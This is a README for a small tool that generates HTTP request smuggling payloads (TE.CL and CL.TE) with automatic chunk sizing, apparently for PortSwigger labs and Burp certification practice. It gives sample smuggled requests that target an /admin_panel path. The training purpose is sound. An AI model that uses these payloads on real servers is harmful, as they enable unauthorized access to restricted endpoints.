## Introduction
This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs. The most important about this tool is <b>TE.CL</b> vulnerability exploitation and chunk size auto generator so you don't have to calculate the chunk size for the second(malicious request). <b>Τhis tool is simple but very useful</b>

The inspiration about this tool it was the [HTTP Requests Smuggler](https://github.com/PortSwigger/http-request-smuggler/) extension tool from burpsuite to use it you must have a valid burpsuite license.

For the valid chunk generator (TE.CL) i found the source code from [HTTP Requests Smuggler](https://github.com/PortSwigger/http-request-smuggler/) extension. You can find the source code below. <br>
> [TE-CL | PortSwigger HTTP Request Smuggler Resource](https://github.com/PortSwigger/http-request-smuggler/blob/master/resources/TE-CL.py) <br>
> [CL-TE | PortSwigger HTTP Request Smuggler Resource](https://github.com/PortSwigger/http-request-smuggler/blob/master/resources/CL-TE.py)

#### Attention this tool does not offer automated exploitation. You have to identify the injection point and exploit it manually!


## Installation
```
$ git clone https://github.com/dhmosfunk/simple-http-smuggler-generator.git
$ python3 tool.py --help
```

## Usage
Sometimes needs to use and append more HTTP Headers in the malicious request for different purposes E.g. bypass localhost restrictions. So you can add your own HTTP headers at `/lib/clte.py` or `/lib/tecl.py`.

```
$ python3 tool.py --help
usage: tool.py -v clte/tecl -host xxxxxxxxxx.net  -a admin_panel -m GET

options:
  -h, --help            show this help message and exit
  -v VULNERABILITY, --vulnerability VULNERABILITY
                        Possible values CLTE or TECL
  -host HOSTNAME, --hostname HOSTNAME
                        Target HOSTNAME
  -a ACTION, --action ACTION
                        ex. admin_panel
  -m METHOD, --method METHOD
                        Request Methods [GET, POST]
```

### Generating TE.CL Request
```
$ python3 tool.py -v tecl -host xxxx.net -a admin_panel -m get

---[TE.CL Payload Generated]---

Transfer-Encoding: chunked
Content-Length: 3

75
GET /admin_panel HTTP/1.1
Host: xxxx.net
Content-Type: application/x-www-form-urlencoded
Content-length: 15

x=1
0

---[TE.CL Payload Generated]---

[INFO]> Dont forget the \r\n after 0
Also disable the auto-update Content-Length from menu
```

### Send TE.CL Request
![image](https://user-images.githubusercontent.com/45040001/190521300-8a2cd4ec-3727-4c5c-a631-da0e86cb56f2.png)


### Generating CL.TE Request
```
$ python3 tool.py -v clte -host xxxx.net -a admin_panel -m get

---[CL.TE Payload Generated]---

Transfer-Encoding: chunked

0

GET /admin_panel HTTP/1.1
Host: xxxx.net
X-Ignore: X


---[CL.TE Payload Generated]---
```

### Send CL.TE Generated Request
![image](https://user-images.githubusercontent.com/45040001/190520684-1941ec58-15ef-4c92-96c1-4e4fc8181d8e.png)
